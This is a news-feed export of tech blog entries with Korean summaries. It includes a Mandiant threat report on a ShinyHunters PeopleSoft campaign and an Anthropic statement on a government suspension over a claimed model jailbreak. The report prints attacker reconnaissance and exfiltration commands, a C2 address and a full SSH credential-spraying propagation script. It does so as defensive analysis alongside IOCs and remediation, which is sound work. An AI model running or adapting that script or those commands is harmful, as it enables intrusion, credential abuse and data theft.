-    "cleanContent": "Terraform MCP server enables AI assistants like GitHub Copilot, IBM Bob, Claude Code  etc. to interact with Terraform through the Model Context Protocol (MCP). By connecting AI to your infrastructure workflows, teams reduce manual effort, eliminate context switching between tools, and accelerate delivery without compromising security.\nToday, we're announcing the general availability of Terraform MCP server, now available for both HCP Terraform and Terraform Enterprise. This represents a milestone shaped by customer and community feedback since we first announced Terraform MCP server last year. In this post, we'll explore how Terraform MCP server improves infrastructure team productivity through AI-assisted workflows, maintains security by design, and provides flexible deployment options for teams of any size.\nAccelerate infrastructure workflows with AI\nTeams previously spent significant time on repetitive tasks: searching documentation, interpreting plan files, and auditing configurations. Terraform MCP server shifts this burden to AI assistants, allowing engineers to focus on strategic work rather than routine operations.\nGenerate code using your organization's standards\nBefore, engineers manually searched private registries for approved modules, copied examples, and verified compliance with organizational policies. This process was time-consuming and error-prone, often resulting in inconsistent infrastructure patterns across teams.\nNow, AI assistants can connect directly to your Terraform or Terraform Enterprise private registry. They discover approved modules, understand your organization's patterns, and generate compliant code automatically. This eliminates the need to manually search modules and ensures consistent infrastructure across your organization, reducing both development time and compliance risk.\nAccess Terraform workspace data and configurations\nManaging infrastructure across multiple workspaces requires constant context switching between tools and interfaces. Traditionally, engineers navigate through web UIs or CLI commands to gather information about workspace configurations and variables, a fragmented workflow that slows down troubleshooting and decision-making.\nTerraform MCP server provides AI assistants with direct access to workspace data and configurations. Users can ask questions like \"Which workspaces haven't been updated in 90 days?\" or \"Show me workspaces managing more than 1,000 resources,\" and receive immediate answers. This unified access eliminates context switching, enabling teams to gain faster insights and make informed decisions without leaving their development environment.\nUnderstand plan changes with context\nTerraform plan output can be difficult to interpret, especially for complex infrastructure changes. Engineers have traditionally spent time manually parsing plan files, tracing resource dependencies, and assessing the impact of modifications before approval.\nTerraform MCP server now enables AI assistants to analyze plan details and explain changes in natural language. This reduces the risk of misinterpreting plans and speeds up code review cycles, helping teams move faster while maintaining confidence in their infrastructure changes.\nSecurity by design\nFor infrastructure teams, security is non-negotiable. Terraform MCP server acts as a controlled interface that enforces your existing Terraform authentication and authorization. AI assistants receive only the specific information needed to answer questions, and not the credentials or sensitive data, reducing the risk of exposure while maintaining the security boundaries you've already established. The server includes CORS policies, rate limiting, and OpenTelemetry integration for monitoring and security auditing.\nFlexible deployment options\nTerraform MCP server supports deployment modes that fit how your team works. For individual developers, local execution provides the fastest setup and keeps all data on your machine, ideal for personal development and testing. For teams requiring centralized management, the server can be deployed as a shared service that team members access remotely while maintaining individual access controls through their own Terraform tokens.\nBoth deployment modes enforce the same authentication model, credentials remain in the deployment environment, while AI assistants receive only necessary metadata and configuration data needed to respond to queries.\nGet started with Terraform MCP server\nTerraform MCP server works with multiple AI assistants, including IBM Bob, Claude Desktop, GitHub Copilot, and other MCP-compatible tools. To get started:\n·      Read the documentation on setting up the MCP server.\n·      View the private registry tutorial\n·      Go to the GitHub repo\nNew to Terraform? Sign up for an HCP account to get started today and check out our tutorials. HCP Terraform includes a $500 credit that allows users to quickly get started using features from any plan, including HCP Terraform Premium. Contact our sales team if you’re interested in trying our self-managed offering: Terraform Enterprise.",
-    "url": "https://www.hashicorp.com/blog/terraform-mcp-server-is-now-generally-available",
-    "category": "클라우드 & 인프라",
-    "source": "Terraform Blog",
-    "author": "Vishnu Ravindra",
-    "pubDate": "2026-06-11T18:00:00.000Z",
-    "fetchedAt": "2026-06-14T10:33:56.852Z",
-    "tags": [
-      "Terraform",
-      "IaC"
-    ]
-  },
-  {
-    "id": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
-    "title": "Transform dashboards into interactive data experiences with Looker agents",
-    "summary": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask fo",
-    "aiSummary": "Google Cloud는 기존의 정적인 대시보드가 가진 한계를 극복하기 위해 Looker dashboard agents를 프리뷰 버전으로 공개합니다. 사용자는 Gemini 아이콘을 클릭하여 자연어로 질문을 던질 수 있으며, 대시보드 내에 내장된 지능형 에이전트가 문맥을 파악해 실시간으로 답변과 시각화 자료를 제공합니다.\n\nLooker dashboard agents는 대시보드에 적용된 필터와 교차 필터, 기존 타일 정보를 직접 참조하여 복잡한 비즈니스 질문에 대해 정확한 분석 결과를 도출합니다. 데이터 분석가는 시맨틱 레이어 상단에 자연어 지침을 추가하여 에이전트가 기업 고유의 비즈니스 로직을 올바르게 해석하도록 세밀하게 구성할 수 있습니다. 이를 통해 분석가 팀의 업무 부담을 줄이고 사용자가 직접 데이터를 탐색하는 셀프 서비스 분석 환경을 지원합니다.\n\n시스템에 대한 신뢰성을 확보하기 위해 에이전트는 답변 도출 과정에서의 추론 단계와 참조한 데이터 소스, 적용된 필터 등을 투명하게 공개합니다. 또한 Looker의 기존 거버넌스 모델 및 권한 관리 체계를 그대로 계승하여 허가된 사용자만 데이터에 접근할 수 있도록 설계되었습니다.\n\nLooker 26.08.11 버전 이상부터 관리자 설정에서 Gemini in Looker 기능을 활성화하여 사용할 수 있으며, 향후 iframe 임베딩 지원 등을 통해 외부 포털이나 애플리케이션으로 확장될 예정입니다.",
-    "cleanContent": "Dashboards have long served as a primary way for organizations to extract insights from data, but they can fall short in agile environments: Dashboards aren’t interactive and don’t allow you to ask follow-up questions. This forces users to step outside their workflows or turn to data analysts to get the answers they need. Today, we are introducing Looker dashboard agents in preview, embedding intelligent, conversational data agents directly within dashboards and empowering users to explore their business intelligence (BI) data using natural language.\n\n\n\n\n\n\n\n\n  \n    \nStart a conversation with a Looker dashboard agent\n\n      \n    \n\n  \n      \nInteractive agent-led investigations\nTraditionally, dashboards have presented a static view of data. With dashboard agents in Looker, users can explore their data directly within the dashboard interface. Users can start a conversation by clicking the Gemini icon and asking natural-language questions to receive contextual insights.\nThe accuracy of a data agent depends on the business context it is provided, and its ability to map appropriate metrics and dimensions to users’ inquiries. The Looker dashboard agent has direct context about the user’s applied filters, cross-filters, and pre-curated tiles, helping it to generate highly relevant and accurate answers to complex business questions.\nShould a query require more data, the agent can access underlying Explores to uncover additional information. These insights are paired with relevant charts and natural language explanations to simplify data exploration.\n\n\n\n\n\n\n\n\n  \n    \nExplore data beyond dashboard to uncover deeper insights\n\n      \n    \n\n  \n      \nTailor the agent to your business \nData analysts curate dashboards to provide business users with precise perspectives on organizational data. To maintain this kind of consistent and reliable analytical environment, the Looker dashboard agent is highly configurable. Analysts can add context on top of the Looker semantic layer by providing natural-language instructions directly to the agent. This way, they can define exactly how the agent interprets unique business logic and tailors responses for the target audience. By enabling self-serve data analysis, dashboard agents help analyst teams scale to meet the increasing data demands of the business.\n\n\n\n\n\n\n\n\n  \n    \nConfigure Looker dashboard agents\n\n      \n    \n\n  \n      \nInherited trust and transparency \nFor users to adopt an AI-based system, they must trust the information it provides them. When generating an insight, the Looker dashboard agent explicitly shows its work by displaying intermediate reasoning, referenced dashboard tiles, and applied filters. Additionally, the administrator needs to trust users only have access to data and insights to which they are authorized. The dashboard agent is backed by Looker’s governance model, managed through standard permissions.\nWe are actively working on additional capabilities for the Looker dashboard agent, including support for iframe embedding, allowing organizations to bring dashboard agents alongside Looker dashboards into any essential portal or application.\nEnable dashboard agents today\nWith Looker version 26.08.11 and later, administrators can activate the dashboard agent capability by toggling \"Enable Chat with Dashboard\" within the Gemini in Looker settings. Once enabled, authorized users will see the Gemini icon and can begin chatting with their dashboard data immediately. Please explore our support documentation for more detailed information.",
-    "url": "https://cloud.google.com/blog/products/business-intelligence/dashboard-agents-in-looker/",
-    "category": "클라우드 & 인프라",
-    "source": "Google Cloud Blog",
-    "author": {
-      "$": {
-        "xmlns:author": "http://www.w3.org/2005/Atom"
-      },
-      "name": [
-        "Vaibhavi Sonavane"
-      ],
-      "title": [
-        "Product Manager"
-      ],
-      "department": [
-        ""
-      ],
-      "company": [
-        ""
-      ]
-    },
-    "pubDate": "Thu, 11 Jun 2026 16:00:00 +0000",
-    "fetchedAt": "2026-06-14T10:33:56.852Z",
-    "tags": [
-      "GCP",
-      "Cloud"
-    ]
-  },
-  {
-    "id": "https://www.anthropic.com/news/fable-mythos-access",
-    "title": "Statement on the US government directive to suspend access to Fable 5 and Mythos 5",
-    "summary": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security autho",
-    "aiSummary": "미국 정부는 국가 안보를 이유로 Anthropic의 AI 모델인 Fable 5와 Mythos 5에 대한 모든 외국인의 접근을 즉각 중단하라는 수출 통제 지침을 발표했습니다. 이에 따라 Anthropic은 해당 모델에 대한 고객의 접근을 즉시 차단했습니다.\n\nAnthropic 측은 정부가 지목한 보안 우려 사항이 특정 코드베이스의 소프트웨어 결함을 수정하도록 하는 수준의 단순한 잠재적 우회 기술에 불과하며, 이는 OpenAI의 GPT-5.5를 비롯한 다른 공개 모델에서도 이미 가능한 보편적인 기능이라고 반박했습니다.\n\nAnthropic은 이번 정부 조치가 기술적 사실에 근거하지 않았으며, 동일한 기준을 적용할 경우 업계 전반의 모든 차세대 모델 배포가 중단될 것이라고 지적했습니다. 해당 기업은 이번 지침이 오해에서 비롯되었다고 판단하여 조속한 서비스 복구를 위해 노력하고 있으며, 향후 24시간 내에 상세 내용을 추가로 공유할 예정입니다.",
-    "cleanContent": "ResearchPolicyCommitmentsLearnNewsTry ClaudeAnnouncementsStatement on the US government directive to suspend access to Fable 5 and Mythos 5Jun 12, 2026The US government, citing national security authorities, has issued an export control directive to suspend all access to Fable 5 and Mythos 5 by any foreign national, whether inside or outside the United States, including foreign national Anthropic employees. The net effect of this order is that we must abruptly disable Fable 5 and Mythos 5 for all our customers to ensure compliance. Access to all other Anthropic models will not be affected. We received the directive from the government today at 5:21pm (ET). The letter did not provide specific details of its national security concern. Our understanding is that the government believes it has become aware of a method of bypassing, or “jailbreaking” Fable 5. We reviewed a demonstration of this specific technique being used to identify a small number of previously known, minor vulnerabilities. These vulnerabilities all appear relatively simple, and we have found that other publicly-available models are able to discover them as well without requiring a bypass. Anthropic’s posture with respect to Fable’s safeguards, as laid out in our launch blog post, is the following: To date, the government has only given us verbal evidence of a potential narrow, non-universal jailbreak, which essentially consists of asking the model to read a specific codebase and fix any software flaws. Our understanding is that one potential jailbreak was shared with the government. We have reviewed a report that we believe is the basis of the government&#x27;s directive and validated that the level of capability displayed there is widely available from other models (including OpenAI’s GPT-5.5), and is used every day by the defenders who keep systems safe. We will share more details over the next 24 hours. We are complying with the government’s legal directive and are removing access to Fable 5 and Mythos 5 for all users. However, we disagree that the finding of a narrow potential jailbreak should be cause for recalling a commercial model deployed to hundreds of millions of people. If this standard was applied across the industry, we believe it would essentially halt all new model deployments for all frontier model providers. As we have stated publicly, we believe the government should have the ability to block unsafe deployments, as part of a statutory process that is transparent, fair, clear, and grounded in technical facts. This action does not adhere to those principles. We apologize for this disruption to our customers. We believe this is a misunderstanding and are working to restore access as soon as possible. Related contentResults from the first Anthropic Public RecordRead moreTCS and Anthropic partner to bring Claude to regulated industriesWe’re announcing a partnership with Tata Consultancy Services (TCS). TCS will provide Claude to 50,000 of its own employees across 56 c",
-    "url": "https://www.anthropic.com/news/fable-mythos-access",
-    "category": "인공지능",
-    "source": "Anthropic News",
-    "author": "Anthropic",
-    "pubDate": "2026-06-11T15:00:00.000Z",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Anthropic",
-      "Claude",
-      "AI",
-      "LLM"
-    ]
-  },
-  {
-    "id": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup",
-    "title": "Laracon US 2026 Reveals Its Full Speaker Lineup",
-    "summary": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full",
-    "aiSummary": "오는 7월 28일부터 29일까지 보스턴에서 개최되는 Laracon US 2026의 전체 연사 라인업이 공개되었습니다. 이번 행사는 Laravel의 창시자인 Taylor Otwell을 비롯하여 Aaron Francis, Nuno Maduro, Kent C. Dodds가 주요 연사로 참여하여 자리를 빛낼 예정입니다.",
-    "cleanContent": "Laracon US 2026 has announced its complete speaker lineup for July 28-29 in Boston, headlined by Taylor Otwell, Aaron Francis, Nuno Maduro, and Kent C. Dodds.\nThe post Laracon US 2026 Reveals Its Full Speaker Lineup appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
-    "url": "https://laravel-news.com/laracon-us-2026-reveals-its-full-speaker-lineup?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
-    "category": "백엔드",
-    "source": "Laravel News",
-    "author": "Eric L. Barnes",
-    "pubDate": "Thu, 11 Jun 2026 14:48:54 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Laravel",
-      "PHP"
-    ]
-  },
-  {
-    "id": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open",
-    "title": "The State of PHP 2026 Survey Is Now Open",
-    "summary": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State ",
-    "aiSummary": "JetBrains와 The PHP Foundation이 PHP 개발자들의 업무 환경과 도구 활용 현황, 그리고 향후 언어의 발전 방향을 파악하기 위해 State of PHP 2026 설문 조사를 시작합니다. 이번 설문은 PHP 생태계의 전반적인 동향을 분석하는 첫 번째 프로젝트로, 전 세계 PHP 개발자들의 의견을 수렴하여 언어의 미래를 결정하는 데 활용될 예정입니다. 관심 있는 개발자들은 공식 설문을 통해 관련 데이터 수집에 참여할 수 있습니다.",
-    "cleanContent": "JetBrains and The PHP Foundation have launched the first State of PHP survey, gathering data on how PHP developers work, what tools they use, and where the language should go next.\nThe post The State of PHP 2026 Survey Is Now Open appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
-    "url": "https://laravel-news.com/the-state-of-php-2026-survey-is-now-open?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
-    "category": "백엔드",
-    "source": "Laravel News",
-    "author": "Eric L. Barnes",
-    "pubDate": "Thu, 11 Jun 2026 14:21:19 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Laravel",
-      "PHP"
-    ]
-  },
-  {
-    "id": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
-    "title": "ShinyHunters Targets Education Sector with Oracle PeopleSoft Exploit",
-    "summary": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft applicati",
-    "aiSummary": "Mandiant와 Google Threat Intelligence Group은 UNC6240으로 알려진 위협 행위자 ShinyHunters가 Oracle PeopleSoft의 취약점인 CVE-2026-35273을 악용하여 교육 분야를 중심으로 공격을 감행한 사실을 확인했습니다. CVSS 점수 9.8의 원격 코드 실행 취약점을 이용한 이번 공격은 Oracle의 보안 권고 이전부터 제로데이 형태로 수행되었으며, 주로 고등 교육 기관을 표적으로 삼았습니다.\n\n공격자들은 PSEMHUB 엔드포인트를 통해 침투한 뒤 MeshCentral 원격 관리 도구를 배포하고 정상적인 Microsoft Azure 서비스인 것처럼 위장하여 명령 및 제어 서버를 운영했습니다. 이후 정찰 활동을 통해 시스템 내부 정보를 수집하고 사용자 지정 스크립트를 활용하여 횡적 이동을 시도했으며, 탈취된 데이터는 ShinyHunters의 데이터 유출 사이트에 공개되었습니다.\n\n이번 공격에 대응하기 위해 Oracle PeopleSoft 운영 조직은 외부망에서 PSEMHUB 및 PSIGW 엔드포인트로의 접근을 즉시 차단해야 합니다. 또한 웹 서버의 접근 로그를 분석하여 의심스러운 요청을 확인하고, 시스템 파일 내에 포함된 웹쉘이나 비정상적인 XML 설정 파일이 존재하는지 점검해야 합니다. 추가적으로 외부로 향하는 SMB 트래픽을 모니터링하여 추가적인 공격 시도를 방지할 것을 권장합니다.",
-    "cleanContent": "Introduction\nMandiant and Google Threat Intelligence Group (GTIG) have identified an active compromise and extortion campaign attributed to UNC6240 (ShinyHunters) targeting Oracle PeopleSoft application infrastructure. The activity was observed between May 27, 2026, and June 9, 2026 and is consistent with the exploitation of CVE-2026-35273, a critical remote code execution vulnerability (CVSS 9.8) in the Environment Management component. The exploitation of this vulnerability directly aligns with the observed targeting of Environment Management Hub (PSEMHUB) endpoints. Because this activity predates Oracle's June 10, 2026 advisory, the vulnerability was exploited as a zero-day.\nUpon becoming aware of active scanning and exploitation, we initiated notifications to over 100 global organizations whose IP addresses correlated with potentially vulnerable endpoints. Most of these organizations were based in the United States, and 68 percent operated within the higher education sector. Subsequently, public reports by @nahamike01 on X highlighted open attacker directories on the staging servers, allowing GTIG to perform a detailed triage of the threat actor's operations. \nThe attacker staging environments hosted customized MeshCentral agents masquerading as legitimate cloud endpoints, which they used to run administrative command queries and deploy a custom lateral movement and defacement script, [victim_abbreviation]_fanout.sh. This campaign directly correlates with subsequent data leaks of stolen organization data published on the ShinyHunters Data Leak Site (DLS) on June 9, 2026. \nWe recommend that organizations running Oracle PeopleSoft take the following immediate actions to best defend themselves. Additional remediation and hardening guidance is included later in this post.\n\n\n    aside_block\n    ), ('btn_text', ''), ('href', ''), ('image', None)])]>\n\nThreat Detail & Campaign Overview\nOn June 9 2026, public threat reports highlighted open attacker directories. GTIG triaged five sequential IP addresses: 142.11.200.186, 142.11.200.187, 142.11.200.188, 142.11.200.189, and 142.11.200.190. These systems were hosting Python SimpleHTTP servers on port 8888, exposing directory contents that included staging materials, customized agents, and attacker command histories.\nThe staging infrastructure hosted pre-configured Windows MeshCentral agent binaries disguised as Microsoft Azure services, specifically named meshagent32-azure-ops.exe, meshagent64-azure-ops.exe, and meshagent64-v2.exe. MeshCentral is an open-source remote management server; its agent is software that runs on remote devices to allow for remote management across various operating systems, including Windows, Linux, macOS, and FreeBSD. Static analysis indicates these agents were hardcoded to establish communication with the command and control (C2) server wss://azurenetfiles.net:443/agent.ashx. The domain azurenetfiles.net was chosen to mimic legitimate Microsoft Azure NetApp Files endpoints, a common masquerading tactic. An unconfigured Linux meshagent binary was also staged, suggesting that the threat actors passed parameters dynamically via the command line during deployment.\nGlobal Notification Response Campaign\nPrior to the discovery of the open staging directories, we began an effort to alert over 100 exposed organizations to assist in restricting access to vulnerable endpoints. These organizations are significantly concentrated in the Higher Education sector; 68 percent are academic institutions, including universities and colleges worldwide.\nWhile several organizations successfully blocked the activity or remediated the vulnerabilities, others experienced compromise, resulting in stolen data being published on the ShinyHunters DLS.\nTechnical Analysis & Command History\nThe exposed .bash_history file, which was identical across all five staging hosts, outlines the server configuration and administrative actions. The technical narrative begins with the configuration of the staging environment. On May 27, 2026, at 22:14 UTC, the attackers installed the MeshCentral remote management server (version 1.1.59) to establish their C2 staging environment. Shortly after, at 22:25 UTC, they installed the acme-client npm package to automate the provisioning of Let's Encrypt SSL certificates for the masquerading domain \"azurenetfiles.net\".  The attackers interacted with compromised systems using the MeshCentral command-line interface utility meshctrl.js.\nThe command history shows the threat actors performing targeted reconnaissance within compromised internal networks. They mapped Oracle PeopleSoft configurations by inspecting mount points, checking the process scheduler configuration file psappsrv.cfg, and reading WebLogic server XML configurations (config.xml). The session log ends with the attackers establishing an outbound SSH connection from their staging system to 176.120.22.24, which hosts the public clearnet mirror of the ShinyHunters DLS.\nAn analysis of the exposed command history reveals the key administrative and malicious operations performed by the threat actors on the staging servers (timestamps were not available in every case):\n1. Staging Infrastructure Setup:\nMay 27, 2026, 22:14 UTC: Installed MeshCentral (v1.1.59) and 22:25 UTC: Installed \"acme-client\" to establish the C2 staging environment and automate SSL certificate provisioning for azurenetfiles.net.\nStaged the compiled Windows agent binaries (meshagent32-azure-ops.exe, etc.) designed to communicate back to the C2 address: wss://azurenetfiles.net:443/agent.ashx.\nMay 29, 2026, 18:46 UTC: The attackers checked for the availability of the \"authenticode\" tool on the staging system using the command npm list global authenticode. This command would return any npm package with a name starting in 'authenticode', such as authenticode-sign, used for signing binaries, or authenticode, used for examining metadata on a file.\n2. Targeted Internal Reconnaissance:\nLeveraged the MeshCentral CLI utility meshctrl.js to execute administrative command queries on compromised remote endpoints: hostname; id.\nMapped Oracle PeopleSoft system configurations by inspecting the process scheduler configuration file (psappsrv.cfg) to extract machine names and IP addresses:\n\n\ngrep -hE '\\''^[[:space:]]*Address=|^[[:space:]]*HostName='\\'' /u01/app/psoft/ps_config_homes/csprd/appserv/prcs/psappsrv.cfg 2>/dev/null | head -80\n\n\nAudited network configurations and active mounts on compromised hosts: mount | grep -E \"psoft|ps_config|nfs\".\nMapped internal subnet hosts by querying local hosts tables: cat /etc/hosts | grep -E \"[redacted_victim_string]\".\nInspected WebLogic XML configurations (config.xml) to map internal application servers.\n3. Lateral Movement & Script Propagation:\nWrote the lateral propagation script [victim_abbreviation]_fanout.sh via a heredoc to /tmp on the staging host.\nTriggered the execution of the propagation script on compromised hosts using the MeshCentral command execution feature:\n\n\nnode meshctrl.js RunCommand --loginuser admin --loginpass '[password]' --id '[agent_id]' --run 'bash /tmp/[victim_abbreviation]_fanout.sh'\n\n\nVerified propagation success by running remote checks for the defacement marker file README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT.\n4. Exfiltration & DLS Connection:\nCompressed exfiltrated directories containing stolen data using zstd:\n\n\npv -s \"$(du -sb exfil | awk '{print $1}')\" | zstd -3 -T0 -o exfil.tar.zst\n\n\nConcluded operations by establishing an outbound SSH connection from the staging host to 176.120.22.24, the IP address hosting the public mirror of the ShinyHunters Data Leak Site.\n\n\n\n\n\n\n\n\n  \n    \nFigure 1: ShinyHunters DLS Post showing Peoplesoft victim added June 9, 2026\n\n      \n    \n\n  \n      \nPropagation Script & Lateral Movement\nAs observed in the .bash_history log, the threat actors wrote a propagation script named [victim_abbreviation]_fanout.sh directly to the /tmp directory of the compromised system. This script automates SSH credential spraying against internal hosts by parsing hostnames from the local /etc/hosts file matching a specific naming pattern. The script attempts authentication using a hardcoded list of common administrative and application-specific usernames and passwords.\nUpon establishing a successful SSH session, the script copies a defacement and extortion marker file named README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT into the WebLogic and Process Scheduler directories. This staging and deployment activity directly correlates with the publication of stolen archives on the ShinyHunters DLS on June 9, 2026.\nThe redacted contents of the propagation script [victim_abbreviation]_fanout.sh are as follows:\n\n\nset +e\r\nSRC=\"/u01/app/psoft/ps_config_homes/csprd/webserv/CSPRD02/README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nNAME=\"README-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\"\r\nBASE=\"/u01/app/psoft/ps_config_homes/csprd\"\r\nexport PATH=/usr/bin:/bin\r\n# hosts from /etc/hosts — internal PS nodes only\r\nHOSTS=$(grep -E '[redacted_victim_host_pattern]|csprd[0-9]' /etc/hosts | awk '{print $2}' | grep -v '^#' | sort -u)\r\necho \"HOSTS=$(echo $HOSTS | wc -w)\"\r\nPWDS=\"[redacted_passwords]\"\r\nUSERS=\"[redacted_usernames]\"\r\nOK=0; FAIL=0; SKIP=0\r\nfor h in $HOSTS; do\r\n  echo \"=== $h ===\"\r\n  copied=0\r\n  for u in $USERS; do\r\n    for p in $PWDS; do\r\n      sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=no $u@$h \"hostname\" >/dev/null 2>&1 && {\r\n        for dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n          sshpass -p \"$p\" ssh -o StrictHostKeyChecking=no $u@$h \"test -d $dest && mkdir -p $dest && cat > $dest/$NAME\" /dev/null && echo \"  OK $dest ($u)\" && OK=$((OK+1)) && copied=1\r\n        done\r\n        break 2\r\n      }\r\n    done\r\n  done\r\n  if [ $copied -eq 0 ]; then\r\n    # try key-based\r\n    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o BatchMode=yes $USER@$h \"hostname\" >/dev/null 2>&1 && copied=1 || true\r\n    if [ $copied -eq 0 ]; then echo \"  FAIL ssh\"; FAIL=$((FAIL+1)); fi\r\n  fi\r\ndone\r\n# local paths on this host\r\nfor dest in $BASE/webserv/CSPRD $BASE/webserv/CSPRD02 $BASE/appserv/prcs; do\r\n  if [ -d \"$dest\" ]; then cp -f \"$SRC\" \"$dest/$NAME\" && chmod 644 \"$dest/$NAME\" && echo \"LOCAL OK $dest\"; fi\r\ndone\r\necho SUMMARY ok=$OK fail=$FAIL\r\nfind $BASE -name \"$NAME\" -type f 2>/dev/null\n\n\nRemediation and Hardening\nTo defend against this campaign, we recommend that organizations running Oracle PeopleSoft immediately implement the following security measures:\nNetwork Isolation & WAF Rules\nEndpoint Access Restrictions: If you cannot disable the EMHub Service, immediately block external network access to the sensitive endpoints /PSEMHUB/* (specifically /PSEMHUB/hub) and /PSIGW/HttpListeningConnector at the network perimeter or firewall level. Relying solely on Web Application Firewall (WAF) body-inspection rules is insufficient, as these controls can be bypassed.\nNon-Breaking Action: Restricting these endpoints is considered non-breaking for standard end-user operations. The Environment Management Hub (EMHub) and the Integration Broker Listening Connector are administrative or system-to-system components and are not required for the core user-facing PeopleSoft Internet Architecture (PIA) browser sessions.\nLog & Endpoint Monitoring\nAccess Log Analysis: Audit the PIA WebLogic access logs for HTTP POST requests directed at /PSEMHUB/hub and /PSIGW/HttpListeningConnector originating from external or untrusted source IP addresses.\nSSRF Detection: Analyze requests to /PSIGW/HttpListeningConnector for loopback IP addresses (such as 127.0.0.1, localhost, or ::1) or internal IP ranges passed within request headers or parameters. This is a common method for attackers to perform Server-Side Request Forgery (SSRF) to bypass access controls.\nNetwork Telemetry\nOutbound Port 445 Monitoring: Monitor outbound firewall logs and NetFlow data for outbound SMB traffic (TCP port 445) originating from PeopleSoft hosts to untrusted, external internet destinations. The exploit chain may coerce the system into making outbound connections in an attempt to capture Windows machine-account NetNTLM hashes.\nHost-Level Auditing & Filesystem Checks\nConduct a thorough forensic audit of the web-tier filesystem on PeopleSoft hosts for indicators of compromise:\nWebshell Detection: Scan the WebLogic web application directory /webserv//applications/peoplesoft/PSEMHUB.war/ for any unexpected *.jsp files that are not part of the shipped product.\nUnauthorized Staging: Inspect the staging directory .../PSEMHUB.war/envmetadata/transactions/ for unauthorized folders, files, or binary drops.\nUnexpected Directories: Look for unexpected directories named logs, persistantstorage, or scratchpad under the PSEMHUB directories.\nXMLDecoder Persistence: Check /envmetadata/data/environment/ for recently created or modified .xml files, which may be leveraged by threat actors to execute remote code via XMLDecoder upon application restart.\nIn alignment with Oracle’s security advisory, we consider the implementation of these mitigations to be a high-priority risk reduction measure and strongly recommend immediate action to address the identified exposure. As this vulnerability is remotely exploitable without authentication and may result in remote code execution, organizations must remain on actively supported versions and apply all Critical Patch Updates, Critical Security Patch Updates, and Security Alerts without delay. Review the full Oracle Security Alert Advisory - CVE-2026-35273 for complete details.\nIndicators of Compromise (IOCs)\nTo assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI collection for registered users.\nStaging & C2 Network Indicators\n142.11.200.186\n142.11.200.187\n142.11.200.188\n142.11.200.189\n142.11.200.190\nazurenetfiles.net\nStaging Payloads & Attacker Files\n\n\n\n\n\n\nFile Path / Name\nIndicator Type\nDescription\nValue / Hash (SHA-256)\n.bash_history\nFile Hash\nAttacker command history\n2ab684d93c1553fad87041b4dea97188a97e78589deee2a7bacff905564f3a35\nmeshagent64-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nf02a924c9ff92a8780ce812511341182c6b509d45bc59f3f7b522e37225d24fc\nmeshagent64-v2.exe\nFile Hash\nPre-configured Windows agent\nd83fdb9e53c5ff03c4cb0451ea1bebd79b53f29eadc1e2fa394c7af13a86ce2f\nmeshagent32-azure-ops.exe\nFile Hash\nPre-configured Windows agent\nc7e9332731b06644fc73e0046a2a89eaa59b09f54250e9bd622467187351711f\nmeshagent\nFile Hash\nUnconfigured Linux agent\n68257a6f9ff196179ec03624e849927f26599eb180a7c82e14ef5bc4e93bc309\nREADME-IF-YOU-SEE-THIS-YOUVE-BEEN-HACKED.TXT\nFilename\nDefacement / extortion marker\nN/A\n[victim_abbreviation]_fanout.sh\nFilename\nPropagation script\nN/A\n\n\n\n\n\n\n\n\n\n\nGoogle Security Operations (SecOps)\nSecOps customers will have access to the following pending-deployment rules. Once fully deployed, these rules will be available under the Mandiant Frontline Threats rule pack:\nOracle PeopleSoft Configuration Inspection\nOracle PeopleSoft Suspicious JSP File Write to PSEMHUB\nSshpass Interactive File Deployment\nData Archiving or Compression via Zstd Utility\nMeshCentral Command Execution via Meshctrl",
-    "url": "https://cloud.google.com/blog/topics/threat-intelligence/shinyhunters-targets-education-sector-oracle-exploit/",
-    "category": "클라우드 & 인프라",
-    "source": "Google Cloud Blog",
-    "author": {
-      "$": {
-        "xmlns:author": "http://www.w3.org/2005/Atom"
-      },
-      "name": [
-        "Mandiant "
-      ],
-      "title": [
-        ""
-      ],
-      "department": [
-        ""
-      ],
-      "company": [
-        ""
-      ]
-    },
-    "pubDate": "Thu, 11 Jun 2026 14:00:00 +0000",
-    "fetchedAt": "2026-06-14T10:33:56.852Z",
-    "tags": [
-      "GCP",
-      "Cloud"
-    ]
-  },
-  {
-    "id": "https://www.docker.com/?p=91063",
-    "title": "Docker Hardened Images enhanced vulnerability scanning with Docker and Aikido",
-    "summary": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time",
